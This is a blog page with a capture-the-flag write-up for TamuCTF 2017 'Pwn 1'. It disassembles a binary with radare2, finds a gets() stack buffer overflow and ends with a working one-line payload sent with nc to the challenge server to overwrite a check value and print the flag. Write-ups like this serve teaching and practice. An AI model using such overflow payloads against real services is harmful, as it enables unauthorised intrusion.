<!DOCTYPE html>
<html>
<head>
    <meta name="generator" content="Hugo 0.30-DEV" />

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="My thoughts and rambles">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <link rel="icon" type="image/png" href="/images/favicon.ico">

    
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="/images/touch/chrome-touch-icon-192x192.png">

    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="apple-touch-icon-precomposed.png">

    
    <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">

    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en"/>
    <link rel="stylesheet" href="/css/ionicons.min.css"/>
    <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.1.3/material.grey-orange.min.css"/>
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="/css/hmdl-style.css"/>
	<link rel="stylesheet" href="/css/pygment.css">


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-103806632-1', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>


    <title>TamuCTF 2017 - Pwn 1</title>
</head>

<body style="background-image: url('/images/background.jpg');">
    <div id="MainCnt" class="hmdl-body mdl-layout mdl-js-layout has-drawer is-upgraded">        
        <header class="mdl-layout__header mdl-layout__header--transparent mdl-layout__header--scroll">
            <div class="mdl-layout__header-row">
                <div class="mdl-layout-spacer"></div>
                <nav class="mdl-navigation">
                <a class="mdl-navigation__link" href="/">Home</a>
                <a class="mdl-navigation__link" href="/post/">Articles</a>
                <a class="mdl-navigation__link" href="/project/">Projects</a>
                <a class="mdl-navigation__link" href="/about/">About</a>
                </nav>
            </div>
        </header>
        <div class="mdl-layout__drawer">
            <nav class="mdl-navigation">
            <a class="mdl-navigation__link" href="/">Home</a>
            <a class="mdl-navigation__link" href="/post/">Articles</a>
            <a class="mdl-navigation__link" href="/project/">Projects</a>
            <a class="mdl-navigation__link" href="/about/">About</a>
            </nav>
        </div>

        <main class="mdl-layout__content">

		

            <div class="hmdl-page mdl-grid">
                <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
                    <div class="mdl-card__media mdl-color-text--grey-50" style=" background-color:white;">
                        <h3 style="color:orange;">TamuCTF 2017 - Pwn 1</h3>
                    </div>
                    <div class="hmdl-page-meta mdl-color-text--grey-700 mdl-card__supporting-text">
                        <div class="minilogo" style="background-image: url('/images/avatar-64x64.png');"></div>

                        <div>
							<strong>
                            		<strong>Tzaoh</strong>
							</strong>
                            <span>Aug 8, 2017</span>
                        </div>
                        <div class="section-spacer"></div>
                    </div>
                    <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
                        

<p><img src="/assets/TamuCTF2017/pwn1/1-pwn1_description.png" alt="Pwn1 Challenge Description" /></p>

<p>We are told that there is a binary running remotely and its code is available to download. Lets download and open it with r2.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ wget https://ctf.tamu.edu/files/7e968d03d9caa11a2f4f2909bd3cabc9/pwn1
</span><span class="">$ r2 -A pwn1  </span></code></pre>
</div>
<blockquote>
<p>At some point the link will be broken, if so you can use the <a href="https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn1/pwn1">one</a> from the repository.</p>
</blockquote>

<p>Now that the binary is opened, lets see some stuff inside it.</p>

<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x08048450]&gt; afl
</span><span class="">0x08048390    3 35           sym._init
</span><span class="">0x080483d0    1 6            sym.imp.gets
</span><span class="">0x080483e0    1 6            sym.imp._IO_getc
</span><span class="">0x080483f0    1 6            sym.imp.puts
</span><span class="">0x08048400    1 6            sym.imp.__libc_start_main
</span><span class="">0x08048410    1 6            sym.imp.setvbuf
</span><span class="">0x08048420    1 6            sym.imp.fopen
</span><span class="">0x08048430    1 6            sym.imp.putchar
</span><span class="">0x08048440    1 6            sub.__gmon_start___252_440
</span><span class="">0x08048450    1 33           entry0
</span><span class="">0x08048480    1 4            sym.__x86.get_pc_thunk.bx
</span><span class="">0x08048490    4 43           sym.deregister_tm_clones
</span><span class="">0x080484c0    4 53           sym.register_tm_clones
</span><span class="">0x08048500    3 30           sym.__do_global_dtors_aux
</span><span class="">0x08048520    4 43   -&gt; 40   sym.frame_dummy
</span><span class="hl"><span class="">0x0804854b    4 103          sym.print_flag
</span></span><span class="hl"><span class="">0x080485b2    4 120          main
</span></span><span class="">0x08048630    4 93           sym.__libc_csu_init
</span><span class="">0x08048690    1 2            sym.__libc_csu_fini
</span><span class="">0x08048694    1 20           sym._fini</span></code></pre>
</div>

<p>Interesting, there is <code>print_flag</code> function at <code>0x0804854b</code>. Lets see what&rsquo;s inside of it.</p>

<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x08048450]&gt; s sym.print_flag 
</span><span class="">[0x0804854b]&gt; pdf 
</span><span class="">┌ (fcn) sym.print_flag 103 
</span><span class="">│   sym.print_flag ();
</span><span class="">│           ; var int local_dh @ ebp-0xd
</span><span class="">│           ; var int local_ch @ ebp-0xc
</span><span class="">│              ; CALL XREF from 0x08048606 (main)
</span><span class="">│           0x0804854b      55             push ebp
</span><span class="">│           0x0804854c      89e5           ebp = esp
</span><span class="">│           0x0804854e      83ec18         esp -= 0x18
</span><span class="">│           0x08048551      83ec0c         esp -= 0xc
</span><span class="">│           0x08048554      68b0860408     push str.How_did_you_figure_out_my_secret__
</span><span class="">│           0x08048559      e892feffff     sym.imp.puts ()
</span><span class="">│           0x0804855e      83c410         esp += 0x10
</span><span class="">│           0x08048561      83ec08         esp -= 8
</span><span class="">│           0x08048564      68d3860408     push 0x80486d3
</span><span class="hl"><span class="">│           0x08048569      68d5860408     push str.flag.txt
</span></span><span class="hl"><span class="">│           0x0804856e      e8adfeffff     sym.imp.fopen ()
</span></span><span class="">│           0x08048573      83c410         esp += 0x10
</span><span class="">│           0x08048576      8945f4         dword [local_ch] = eax
</span><span class="">│       ┌─&lt; 0x08048579      eb10           goto 0x804858b
</span><span class="">│       │      ; JMP XREF from 0x080485a0 (sym.print_flag)
</span><span class="">│      ┌──&gt; 0x0804857b      0fbe45f3       eax = byte [local_dh]
</span><span class="">│      |│   0x0804857f      83ec0c         esp -= 0xc
</span><span class="">│      |│   0x08048582      50             push eax
</span><span class="">│      |│   0x08048583      e8a8feffff     sym.imp.putchar ()
</span><span class="">│      |│   0x08048588      83c410         esp += 0x10
</span><span class="">│      ↑│      ; JMP XREF from 0x08048579 (sym.print_flag)
</span><span class="">│      |└─&gt; 0x0804858b      83ec0c         esp -= 0xc
</span><span class="">│      |    0x0804858e      ff75f4         push dword [local_ch]
</span><span class="">│      |    0x08048591      e84afeffff     sym.imp._IO_getc ()
</span><span class="">│      |    0x08048596      83c410         esp += 0x10
</span><span class="">│      |    0x08048599      8845f3         byte [local_dh] = al
</span><span class="">│      |    0x0804859c      807df3ff       var = byte [local_dh] - 0xff
</span><span class="">│      └──&lt; 0x080485a0      75d9           if (var) goto 0x804857b
</span><span class="">│           0x080485a2      83ec0c         esp -= 0xc
</span><span class="">│           0x080485a5      6a0a           push 0xa
</span><span class="">│           0x080485a7      e884feffff     sym.imp.putchar ()
</span><span class="">│           0x080485ac      83c410         esp += 0x10
</span><span class="">│           0x080485af      90             
</span><span class="">└           0x080485b0      c9             </span></code></pre>
</div>

<p>Because of the offsets <code>0x08048569</code> and <code>0x0804856e</code>, we can deduce that the function opens a file called <code>flag.txt</code> and prints its content. Fantastic ✌️ , so we just need to know who will call <code>print_flag</code>. This can be figured out through the <code>axt</code> command of r2 which stands for &ldquo;cross reference to&rdquo; the current function.</p>
<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x0804854b]&gt; axt
</span><span class="">call 0x8048606 call sym.print_flag in main</span></code></pre>
</div>
<p>Cool, so this function will be called from offset <code>0x8048606</code> which belongs to <code>main</code> function. Lets see whats inside it.</p>

<p><div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x0804854b]&gt; pdf @ main   
</span><span class="">            ;-- main:
</span><span class="">┌ (fcn) main 120
</span><span class="">│   main ();
</span><span class="">│           ; var int local_27h @ ebp-0x27
</span><span class="">│           ; var int local_ch @ ebp-0xc
</span><span class="">│           ; var int local_4h_2 @ ebp-0x4
</span><span class="">│           ; var int local_4h @ esp+0x4
</span><span class="">│              ; DATA XREF from 0x08048467 (entry0)
</span><span class="">│           0x080485b2      8d4c2404       ecx = [local_4h]
</span><span class="">│           0x080485b6      83e4f0         esp &amp;= 0xfffffff0
</span><span class="">│           0x080485b9      ff71fc         push dword [ecx - 4]
</span><span class="">│           0x080485bc      55             push ebp
</span><span class="">│           0x080485bd      89e5           ebp = esp
</span><span class="">│           0x080485bf      51             push ecx
</span><span class="">│           0x080485c0      83ec24         esp -= 0x24
</span><span class="">│           0x080485c3      a130a00408     eax = dword obj.stdout
</span><span class="">│           0x080485c8      6a00           push 0
</span><span class="">│           0x080485ca      6a00           push 0
</span><span class="">│           0x080485cc      6a02           push 2
</span><span class="">│           0x080485ce      50             push eax
</span><span class="">│           0x080485cf      e83cfeffff     sym.imp.setvbuf ()
</span><span class="">│           0x080485d4      83c410         esp += 0x10
</span><span class="">│           0x080485d7      83ec0c         esp -= 0xc
</span><span class="">│           0x080485da      68de860408     push str.Enter_the_secret_word:
</span><span class="">│           0x080485df      e80cfeffff     sym.imp.puts ()
</span><span class="">│           0x080485e4      83c410         esp += 0x10
</span><span class="">│           0x080485e7      c745f4000000.  dword [local_ch] = 0
</span><span class="">│           0x080485ee      83ec0c         esp -= 0xc
</span><span class="hl"><span class="">│           0x080485f1      8d45d9         eax = [local_27h]
</span></span><span class="hl"><span class="">│           0x080485f4      50             push eax
</span></span><span class="hl"><span class="">│           0x080485f5      e8d6fdffff     sym.imp.gets ()
</span></span><span class="">│           0x080485fa      83c410         esp += 0x10
</span><span class="hl"><span class="">│           0x080485fd      817df41eab11.  var = dword [local_ch] - 0xca11ab1e
</span></span><span class="hl"><span class="">│       ┌─&lt; 0x08048604      7507           if (var) goto 0x804860d
</span></span><span class="hl"><span class="">│       │   0x08048606      e840ffffff     sym.print_flag ()
</span></span><span class="">│      ┌──&lt; 0x0804860b      eb10           goto 0x804861d
</span><span class="">│      ││      ; JMP XREF from 0x08048604 (main)
</span><span class="">│      │└─&gt; 0x0804860d      83ec0c         esp -= 0xc
</span><span class="">│      │    0x08048610      68f5860408     push str.That_is_not_the_secret_word_
</span><span class="">│      │    0x08048615      e8d6fdffff     sym.imp.puts ()             ; int puts(const char *s)
</span><span class="">│      │    0x0804861a      83c410         esp += 0x10
</span><span class="">│      │       ; JMP XREF from 0x0804860b (main)
</span><span class="">│      └──&gt; 0x0804861d      b800000000     eax = 0
</span><span class="">│           0x08048622      8b4dfc         ecx = dword [local_4h_2]
</span><span class="">│           0x08048625      c9             
</span><span class="">│           0x08048626      8d61fc         esp = [ecx - 4]
</span><span class="">└           0x08048629      c3             </span></code></pre>
</div></p>

<p>We see that <code>print_flag</code> will be called if the condition <code>local_ch == 0xca11ab1e</code> is satisfied. But wait a moment, if we give a closer look to the assembly instrucctions we realized that the only variable we are supposed to edit is <code>local_27h</code> through the <code>gets</code> function.</p>

<blockquote>
<p>So what we need to do?</p>
</blockquote>

<p>As maybe you know, <code>gets</code> is an unsecure function, because it does not check how many characters it must copy in memory when you introduce them. Then, if we input more characters than it is supposed to store, we will be able to overwrite neighbor local variables!</p>

<p>How can we know the length of the string we must provide? By knowing where the variables are stored onto the stack</p>

<p><img src="/assets/TamuCTF2017/pwn1/5-pwn1_stack_view.png" alt="Pwn1 Stack diagram" /></p>

<p>So finally, how many bytes do we need to start writting <code>local_ch</code>?
Easy!</p>

<p><code>($ebp - 0xC) - ($ebp - 0x27)  = 0x27 - 0xC = 0x1B = 27d</code> 27 Characters.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;A&#34;*27 + &#34;\x1E\xAB\x11\xCA&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4322</span><span class="">
</span><span class="">Enter the secret word:
</span><span class="">How did you figure out my secret?!
</span><span class="">gigem</span><span class="o">{</span><span class="">T00_435Y</span><span class="o">}</span></code></pre>
</div>
<p>Answer: gigem{T00_435Y}</p>

<h3 id="complete-video">Complete video</h3>

<p><a href="https://asciinema.org/a/2juhmtxkdf7qrnzbury7rzzjc?autoplay=1"><img src="https://asciinema.org/a/2juhmtxkdf7qrnzbury7rzzjc.png" width="400"/></a></p>

<h3 id="tools-used">Tools used:</h3>

<ul>
<li><a href="https://github.com/radare/radare2">radare2</a> - To analyze the binary.</li>
<li><a href="https://www.draw.io/">draw.io</a> - To draw some graphics.</li>
<li><a href="https://asciinema.org">asciinema</a> - To record the session.</li>
</ul>

                    </div>
                    <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
                        <strong>
                            	<strong>Tzaoh</strong>
						</strong>
                        <p></p>
                    </div>  
                </div>                
                <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
                    <div class="section-spacer"></div>
                    <a href="/post/tamuctf2017/pwn2/">
                        Newer
                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                            <i class="icon ion-android-arrow-forward"></i>
                        </button>
                    </a>
                </nav>
 
            </div>        
        </main>
        <footer class="mdl-mini-footer">
            <div class="mdl-mini-footer--left-section">                
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="mailto:Firstname@example.com?subject=Hi">
                    <i class="material-icons_lg icon ion-email"></i>
                    <span class="visuallyhidden">Email</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://github.com/BlackHoods">
                    <i class="material-icons_lg icon ion-social-github"></i>
                    <span class="visuallyhidden">Github</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://twitter.com/firstname_lastname">
                    <i class="material-icons_lg icon ion-social-twitter "></i>
                    <span class="visuallyhidden">Twitter</span>
                </a>


            </div>
            <div class="mdl-mini-footer--right-section">
                <span>© 2017 </span>
            </div>
        </footer>
        <div class="mdl-layout__obfuscator"></div>
    </div>
    <script src="https://code.getmdl.io/1.1.3/material.min.js"></script>


</body>
</html>

